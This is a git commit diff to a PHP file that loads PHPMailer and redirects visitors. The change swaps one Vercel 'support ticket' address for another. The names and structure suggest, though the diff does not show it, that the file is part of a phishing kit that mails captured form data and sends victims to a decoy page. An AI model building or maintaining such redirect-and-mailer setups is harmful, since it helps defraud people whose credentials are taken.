93df25324824eb39d7cb919d41664861a0a0ddec
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 15:23:27 +0500

    Update abdullah4.php

--- abdullah4.php
+++ abdullah4.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://create-support-ticket-pass.vercel.app/");
+header("Location:https://abdullah4pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
